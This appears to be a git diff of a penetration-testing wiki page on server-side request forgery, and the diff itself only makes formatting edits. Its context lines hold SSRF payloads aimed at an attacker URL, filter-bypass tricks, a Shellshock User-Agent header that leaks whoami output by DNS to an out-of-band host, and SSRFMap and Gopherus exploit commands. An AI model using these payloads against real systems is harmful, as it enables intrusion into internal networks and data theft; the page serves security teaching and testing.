@@ -25,7 +25,7 @@ sftp://{attacker_url}:11111/
 tftp://{attacker_url}:12346/TESTUDPPACKET
 ```
 
-To scan for a specific range of private IP addresses (other than `localhost`), Use burp suite intruder that can fetch all of IP addresses in the internal network that is targeted.&#x20;
+To scan for a specific range of private IP addresses (other than `localhost`), Use burp suite intruder that can fetch all of IP addresses in the internal network that is targeted.
 
 ### Bypassing filters
 
@@ -35,7 +35,7 @@ In order to conduct SSRF attacks properly, there may be use cases where filters 
 {% tab title="Blacklist input filters" %}
 Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can bypass the filter using various techniques :
 
-* Using an alternative IP representation such as :&#x20;
+* Using an alternative IP representation such as :
 
 <pre><code>http://127.1
 http://0
@@ -56,22 +56,20 @@ The following "URL Format Bypass" cheatsheet gives lots of examples to bypass fi
 {% endtab %}
 
 {% tab title="Whitelist input filters" %}
-## Pattern validation
+### Pattern validation
 
-In this context, a whitelist-based input filter can be used to restrict the types of URLs that a user can submit. For example, the filter might only allow URLs that match the whitelist pattern. In this situation, you can bypass the filter using various techniques :&#x20;
+In this context, a whitelist-based input filter can be used to restrict the types of URLs that a user can submit. For example, the filter might only allow URLs that match the whitelist pattern. In this situation, you can bypass the filter using various techniques :
 
-* Using the `@` character in a URL like this :&#x20;
+* Using the `@` character in a URL like this :
   * `https://{url}@{target_host}`
-* Using the `#` character to indicate that the first field is interpreted as a URL fragment like this :&#x20;
+* Using the `#` character to indicate that the first field is interpreted as a URL fragment like this :
   * `https://{target_host}#{url}`
-* Using the DNS name to place required input into a fully-qualified DNS like this :&#x20;
+* Using the DNS name to place required input into a fully-qualified DNS like this :
   * `https://{url}.{target_host}`
 * URL encode, even double URL encoding this special character to bypass the filter
 * Use a combination of all this technique like using the `#@` characters.
 
-
-
-## [ORED (Open Redirect)](ssrf.md#ored-open-redirect-combination) combination
+### [ORED (Open Redirect)](ssrf.md#ored-open-redirect-combination) combination
 
 In the case the argument is strictly validated and doesn't allow for bypasses relying on pattern validation, if one of the whitelisted app's pages is vulnerable to an [ORED (Open Direct)](ssrf.md#ored-open-redirect-combination), it could be used to make the SSRF possible anyway.
 
@@ -83,7 +81,7 @@ The server would request the ORED-vulnerable page through the SSRF vulnerability
 
 ### Blind SSRF vulnerabilities <a href="#blind-ssrf-vulnerabilities" id="blind-ssrf-vulnerabilities"></a>
 
-A blind SSRF vulnerability is a type of vulnerability that arises when an application makes a request to an external resource using user-supplied input, but the application does not return the response to the user.&#x20;
+A blind SSRF vulnerability is a type of vulnerability that arises when an application makes a request to an external resource using user-supplied input, but the application does not return the response to the user.
 
 It can be achieved to gain full RCE (Remote Command Execution).
 
@@ -137,8 +135,8 @@ User-Agent: () { :; }; /bin/nslookup $(whoami).zad8nb8tb7dst2yohw0br7rr6ich07ow.
 
 <pre class="language-bash"><code class="lang-bash"># using SSRFMap
 python3 ssrfmap.py -r data/request.txt -p url -m readfiles
-<strong>
-</strong><strong># using Gopherus
+
+<strong># using Gopherus
 </strong>gopherus --exploit mysql # It only asks username of the MySQL user
 	 --exploit postgresql # It only asks username of the Postgres user and database name
 	 --exploit fastcgi # It only asks for a file which must be present in the victim system(preferable .php file)
